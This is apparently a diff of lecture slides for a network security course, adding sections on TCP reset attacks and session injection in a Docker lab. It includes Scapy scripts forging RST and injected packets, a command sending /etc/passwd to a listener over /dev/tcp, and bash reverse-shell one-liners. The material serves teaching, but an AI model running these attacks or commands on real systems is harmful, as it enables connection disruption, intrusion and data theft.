@@ -53,7 +53,12 @@
 &nbsp;  
 [Overview](#/overview)  
 [UDP & Attacks](#/udp)  
-[TCP & Attacks](#/tcp)  
+[TCP](#/tcp)  
+[TCP SYN Flood Attack](#/syn-flood)  
+[TCP Reset Attack](#/reset-attack)  
+[TCP Session Hijacking](#/hijacking)  
+[The Mitnick Attack](#/mitnick-attack)  
+[Misc](#/misc)  
 </textarea></section>
 
 <!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
@@ -257,7 +262,7 @@ send(pkt, verbose=0)
 <section>
 
 <section data-markdown id="tcp" class="center"><textarea data-template>
-# TCP & Attacks
+# TCP
 </textarea></section>
     
 <section data-markdown data-separator="^\n\n\n"><textarea data-template>
@@ -354,8 +359,18 @@ Multiple connections are often handled via threading
 - If not sent, the connection will timeout eventually
   - A "heartbeat" message can be sent to keep a connection open
 </textarea></section>
+
+</section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section>
+
+<section data-markdown id="syn-flood" class="center"><textarea data-template>
+# TCP SYN Flood Attack
+</textarea></section>
     
-<section data-markdown data-separator="^\n\n\n" id='syn-flood'><textarea data-template>
+<section data-markdown data-separator="^\n\n\n"><textarea data-template>
 <!-- .slide: class="right-float-img-1000" -->
 ## TCP SYN Flood
 ![](images/graphs/tcp_syn_attack.webp)
@@ -465,10 +480,403 @@ tcp6       0      0 :::22                   :::*                    LISTEN
 
 
 ## Pause here...
-- Pause here, and go back to the [Wireshark slide column](slides/packets.html#/wshark) in the [Packet Sniffing and Spoofing](packets.html#/) slide set
+- Pause here, and go back to the [Wireshark slide column](packets.html#/wshark) in the [Packet Sniffing and Spoofing](packets.html#/) slide set
+</textarea></section>
+
+</section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section>
+
+<section data-markdown id="reset-attack" class="center"><textarea data-template>
+# TCP Reset Attack
+</textarea></section>
+
+<section data-markdown data-separator="^\n\n\n"><textarea data-template>
+<!-- .slide: class="right-float-img-1000" -->
+## TCP Close Connection
+![](images/graphs/tcp_close.webp)
+- Recall the handshake for terminating the connection
+- There are two other ways to terminate a connection:
+  - A timeout if one side does not respond in time
+  - If one side sends a RST (reset) packet
+- RST is like hanging up the phone without saying goodbye
 
 
 
+<!-- .slide: class="right-float-img-600 no-border" -->
+## RST legitimate uses
+[![](https://upload.wikimedia.org/wikipedia/commons/c/cf/Nintendo-Super-Famicom-Console-FL_%28Reset_Button%29.jpg)](https://commons.wikimedia.org/wiki/File:Nintendo-Super-Famicom-Console-FL_(Reset_Button).jpg)
+- If there is no time for the FIN-ACK,FIN-ACK handshake
+- If an error is detected
+- In a SYN flood
+  - Computer A sends a SYN flood packet to server B, spoofing C
+  - When B sends a response to C, C sends back an RST packet
+    - As it realized that it never initiated the connection with server B
+- Notably, there is no response sent, nor expected, from a RST packet
+
+
+
+<!-- .slide: class="right-float-img-800" -->
+## TCP Reset Attack
+![](images/graphs/tcp_reset_attack.webp)
+- Any party can send a RST packet to break an existing TCP connection
+- Must get four values correct:
+  - Source & destination IP
+  - Source & destination port
+  - Sequence number
+- Sequence number is hard, but not impossible
+  - Anything within the window is likely valid
+    - Depending on the network stack implementation
+
+
+
+## TCP Sequence Numbers
+- Sequence numbers are not actually sequential
+- Instead, they add the length of the data of the last packet to the sequence number
+  - So large packets increase the sequence number by a lot more than small packets
+- Hitting enter on a telnet session sends two bytes
+  - The enter byte (`\n`) and a control byte
+- `tcpdump` normally shows the *relative* sequence numbers
+- To make `tcpdump` show the absolute sequence numbers, add the `--absolute-tcp-sequence-numbers` flag
+
+
+
+## TCP Reset Attack Pcaps
+- [rst.pcap](https://kb.mazebolt.com/wp-content/uploads/2018/11/rst.pcap), from [MazeBolt](https://kb.mazebolt.com/knowledgebase/rst-flood/), uses random guesses at the sequence numbers
+
+
+
+## TCP Reset Attack Code
+If *outer1* has a telnet connection to *metasploit*, this will work.
+```python
+import sys
+from scapy.all import *
+
+ip = IP(src="192.168.100.101", dst="192.168.100.3")
+tcp = TCP(dport=23, sport=int(sys.argv[1]), flags="R", 
+          seq=int(sys.argv[2]))
+pkt = ip/tcp
+ls(pkt)
+send(pkt,verbose=0)
+```
+- Note that due to how Docker simulates networks, the attack only works only from *outer1*, and not from, say, *outer2*
+
+
+
+<!-- .slide: class="small-pre wide-pre" -->
+## TCP Reset Attack
+```
+root@outer1:/# tcpdump -i eth1 --absolute-tcp-sequence-numbers port telnet
+
+15:24:24.290756 IP outer1.47658 > metasploit.telnet: Flags [P.], seq 2304951623:2304951625, ack 1773068003, win 501, options [nop,nop,TS val 593972636 ecr 48654356], length 2
+15:24:24.291824 IP metasploit.telnet > outer1.47658: Flags [P.], seq 1773068003:1773068005, ack 2304951625, win 509, options [nop,nop,TS val 48662585 ecr 593972636], length 2
+15:24:24.291861 IP outer1.47658 > metasploit.telnet: Flags [.], ack 1773068005, win 501, options [nop,nop,TS val 593972638 ecr 48662585], length 0
+15:24:24.294358 IP metasploit.telnet > outer1.47658: Flags [P.], seq 1773068005:1773068028, ack 2304951625, win 509, options [nop,nop,TS val 48662587 ecr 593972638], length 23
+15:24:24.294386 IP outer1.47658 > metasploit.telnet: Flags [.], ack 1773068028, win 501, options [nop,nop,TS val 593972640 ecr 48662587], length 0
+
+root@outer1:/# mnt/tcp_reset.py 47658 2304951625
+<output omitted>
+
+15:24:39.110993 IP outer1.47658 > metasploit.telnet: Flags [R], seq 2304951625, win 8192, length 0
+
+15:24:43.639948 IP outer1.47658 > metasploit.telnet: Flags [P.], seq 2304951625:2304951627, ack 1773068028, win 501, options [nop,nop,TS val 593991986 ecr 48662587], length 2
+15:24:43.640010 IP metasploit.telnet > outer1.47658: Flags [R], seq 1773068028, win 0, length 0
+```
+
+See the [pcap](pcaps/tcp_reset.pcap); the telnet session:
+```
+msfadmin@metasploit:~$ 
+msfadmin@metasploit:~$ 
+msfadmin@metasploit:~$ Connection closed by foreign host.
+root@outer1:/# 
+```
+
+
+
+<!-- .slide: class="smaller-pre" -->
+## TCP Reset Attack Output
+```
+version    : BitField  (4 bits)                  = 4               ('4')
+ihl        : BitField  (4 bits)                  = None            ('None')
+tos        : XByteField                          = 0               ('0')
+len        : ShortField                          = None            ('None')
+id         : ShortField                          = 1               ('1')
+flags      : FlagsField                          = <Flag 0 ()>     ('<Flag 0 ()>')
+frag       : BitField  (13 bits)                 = 0               ('0')
+ttl        : ByteField                           = 64              ('64')
+proto      : ByteEnumField                       = 6               ('0')
+chksum     : XShortField                         = None            ('None')
+src        : SourceIPField                       = '192.168.100.101' ('None')
+dst        : DestIPField                         = '192.168.100.3' ('None')
+options    : PacketListField                     = []              ('[]')
+--
+sport      : ShortEnumField                      = 47658           ('20')
+dport      : ShortEnumField                      = 23              ('80')
+seq        : IntField                            = 2304951625      ('0')
+ack        : IntField                            = 0               ('0')
+dataofs    : BitField  (4 bits)                  = None            ('None')
+reserved   : BitField  (3 bits)                  = 0               ('0')
+flags      : FlagsField                          = <Flag 4 (R)>    ('<Flag 2 (S)>')
+window     : ShortField                          = 8192            ('8192')
+chksum     : XShortField                         = None            ('None')
+urgptr     : ShortField                          = 0               ('0')
+options    : TCPOptionsField                     = []              ("b''")
+```
+
+
+
+<h2 class="r-fit-text">Reset Attack Success and Failure</h2>
+
+- Will not work if the TCP packet is encrypted at the network layer (IPsec)
+- Will work via ssh, since that uses TLS to encrypt (transport layer)
+- Video streaming: it's complicated
+  - We have to get the sequence number before the next packet arrives
+  - It won't wait for us like the telnet session did
+
+
+
+<h2 class="r-fit-text">TCP Reset versus video streaming</h2>
+
+```python
+from scapy.all import *
+def spoof_tcp(pkt):
+  ip = IP(dst=..., src=pkg[IP].dst)
+  tcp = TCP(flags="R", seq=pkt[TCP].ack,
+            dport=pkg[TCP].sport, sport=pkt[TCP].dport)
+  send(ip/tcp, verbose=0)
+
+sniff(filter='tcp and src host ...', prn=spoof_tcp)
+```
+- This reads the incoming packet, and adjusts the sequence number appropriately
+  - It's Python, so it may not be fast enough
+- This only sometimes works...
+  - The video playing software (Javascript) can often recover from a disconnect
+  - Buffering of the video prevents a noticeable lag
+</textarea></section>
+
+</section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section>
+
+<section data-markdown id="hijacking" class="center"><textarea data-template>
+# TCP Session Hijacking
+</textarea></section>
+
+<section data-markdown data-separator="^\n\n\n"><textarea data-template>
+<!-- .slide: class="right-float-img-600" -->
+## TCP Session Identification
+
+<img src="http://www.cs.virginia.edu/~asb2t/duimg/n06/image18.png">
+
+- After a TCP connection is established, the server has to keep this session separate from all others it has open
+- It uses four values:
+  - Source & destination IP
+  - Source & destination port
+- If we can spoof these values, our TCP packet will be assigned to that session
+
+
+
+<!-- .slide: class="right-float-img-600" -->
+## TCP Session Injection
+
+<img src="http://www.cs.virginia.edu/~asb2t/duimg/n06/image21.png">
+
+- Packets can arrive out of order, and TCP reassembles them as needed
+- The next packet would be at $x+1$; we send a spoofed packet putting the data at $x+\delta$
+- Once the rest of the packet data arrives, the sender's data, plus our malicious data, is passed to the program
+
+
+
+<h2 class="r-fit-text">Redirecting output to the network</h2>
+
+- We can write output to `/dev/tcp/<ip>/<port>`, and it will be sent, via TCP, to that host and port.
+- On outer1, run `nc -lnv 4760`.  On outer2:
+
+<pre class="code-wrapper wide-pre" style="margin-left:-50px;width:110%;"><code class="hljs language-elixir" data-highlighted="yes"
+  >root@outer2:/# cat /etc/passwd > /dev/tcp/192.168.100.101/4760
+root@outer2:/# 
+</code></pre>
+
+
+On outer1:
+
+```shell
+root@outer1:/# nc -lnv 4760
+Listening on 0.0.0.0 4760
+Connection received on 192.168.100.102 58610
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+tcpdump:x:108:110::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+root@outer1:/# 
+```
+
+
+
+## Preparing the attack
+- *metasploit* is to old a Linux version to allow writing to `/dev/tcp/<ip>/<port>`
+- Actual session hijacking would require a very fast response, and Python is too slow
+- So we'll settle for injection instead
+- And we'll use `nc` to pretend to be a telnet server
+- Once we start telnet, we hit Enter twice to see the packet seq/ack progression
+
+
+
+## The code
+```python
+import sys
+from scapy.all import *
+
+ip = IP(src="192.168.100.101", dst="192.168.100.103")
+tcp = TCP(dport=23, sport=int(sys.argv[1]), flags="A", 
+          seq=int(sys.argv[2]), ack=int(sys.argv[3]))
+data = '\nhello world\n'
+pkt = ip/tcp/data
+ls(pkt)
+send(pkt,verbose=0)
+```
+- This injects "hello world" in a telnet session from outer1 to outer3
+- In `nc`, it will just display; in `telnet` it would execute a command such as:
+```
+cat /etc/passwd > /dev/tcp/192.168.100.101/4760
+```
+
+
+
+<!-- .slide: class="small-pre wide-pre" -->
+## tcpdump on *outer1*
+```
+19:29:54.034748 IP outer1.44214 > outer3.telnet: Flags [P.], seq 2870849840:2870849842, 
+    ack 1750764355, win 502, options [nop,nop,TS val 3447989197 ecr 1367377258], length 2
+19:29:54.034803 IP outer3.telnet > outer1.44214: Flags [.], ack 2870849842, win 509, options [nop,nop,TS val 1367523134 ecr 3447989197], length 0
+
+19:29:57.340297 IP outer1.44214 > outer3.telnet: Flags [P.], seq 2870849842:2870849844, 
+    ack 1750764355, win 502, options [nop,nop,TS val 3447992502 ecr 1367523134], length 2
+19:29:57.340422 IP outer3.telnet > outer1.44214: Flags [.], ack 2870849844, win 509, options [nop,nop,TS val 1367526439 ecr 3447992502], length 0
+
+root@outer1:/mnt# ./tcp_session_hijack.py 44214 2870849844 1750764355
+<output omitted>
+
+19:30:14.946774 IP outer1.44214 > outer3.telnet: Flags [.], seq 2870849844:2870849857, ack 1750764355, win 8192, length 13
+19:30:14.946799 IP outer3.telnet > outer1.44214: Flags [.], ack 2870849857, win 509, options [nop,nop,TS val 1367544046 ecr 3447992502], length 0
+```
+On outer3:
+
+```
+root@outer3:/# nc -lnv 23
+Listening on 0.0.0.0 23
+Connection received on 192.168.100.101 44214
+???????? ??!??"??'????#
+hello world
+```
+
+
+
+<!-- .slide: class="smaller-pre" -->
+## TCP Injection Attack Output
+```
+version    : BitField  (4 bits)                  = 4               ('4')
+ihl        : BitField  (4 bits)                  = None            ('None')
+tos        : XByteField                          = 0               ('0')
+len        : ShortField                          = None            ('None')
+id         : ShortField                          = 1               ('1')
+flags      : FlagsField                          = <Flag 0 ()>     ('<Flag 0 ()>')
+frag       : BitField  (13 bits)                 = 0               ('0')
+ttl        : ByteField                           = 64              ('64')
+proto      : ByteEnumField                       = 6               ('0')
+chksum     : XShortField                         = None            ('None')
+src        : SourceIPField                       = '192.168.100.101' ('None')
+dst        : DestIPField                         = '192.168.100.103' ('None')
+options    : PacketListField                     = []              ('[]')
+--
+sport      : ShortEnumField                      = 44214           ('20')
+dport      : ShortEnumField                      = 23              ('80')
+seq        : IntField                            = 2870849844      ('0')
+ack        : IntField                            = 1750764355      ('0')
+dataofs    : BitField  (4 bits)                  = None            ('None')
+reserved   : BitField  (3 bits)                  = 0               ('0')
+flags      : FlagsField                          = <Flag 16 (A)>   ('<Flag 2 (S)>')
+window     : ShortField                          = 8192            ('8192')
+chksum     : XShortField                         = None            ('None')
+urgptr     : ShortField                          = 0               ('0')
+options    : TCPOptionsField                     = []              ("b''")
+--
+load       : StrField                            = b'\nhello world\n' ("b''")
+```
+
+
+
+## Hijacking instead of injection
+- In actual telnet, the connection would freeze, as the acknowledgement numbers are now wrong
+  - The server sends an ACK to $x+8$ (or however far forward)
+  - But the client never sent $x+8$ (the attacker did), so ignores it
+    - And ignores all future packets
+  - Because the client never acknowledges the packet, the server thinks it is lost
+    - And retransmits it, to the same effect
+
+
+
+## Hijacking instead of injection
+
+<img src="http://www.cs.virginia.edu/~asb2t/duimg/n06/image27.png">
+
+
+
+## Better injection / hijacking
+- Rather than cat'ing output to the /dev device...
+- Let's use a remote (or reverse) shell
+  - Your ping shell from HW P2 would work
+- Have one command download the program and also run it
+
+
+
+## More Reverse Shells
+- We could use:
+```
+/bin/bash -i > /dev/tcp/(ip)/(port)
+```
+- But that only redirects stdout; to redirect stderr also:
+```
+/bin/bash -i > /dev/tcp/(ip)/(port) 2>&1
+```
+- To also handle stdin:
+```
+/bin/bash -i > /dev/tcp/(ip)/(port) 2>&1 0<&1
+```
+- Then run `nc -lnv (port)` on the other machine
+- I couldn't get it to work...
+</textarea></section>
+
+</section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section>
+
+<section data-markdown id="mitnick-attack" class="center"><textarea data-template>
+# The Mitnick Attack
+</textarea></section>
+
+<section data-markdown data-separator="^\n\n\n"><textarea data-template>
+## ...
+</textarea></section>
+
+</section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section>
+
+<section data-markdown id="misc" class="center"><textarea data-template>
+# Misc
+</textarea></section>
+
+<section data-markdown data-separator="^\n\n\n"><textarea data-template>
 ## TCP attacks
 - Imagine Alice is sending something to Bob
 - A host between Alice and Bob, Mallory, can intercept (and potentially discard) these packets
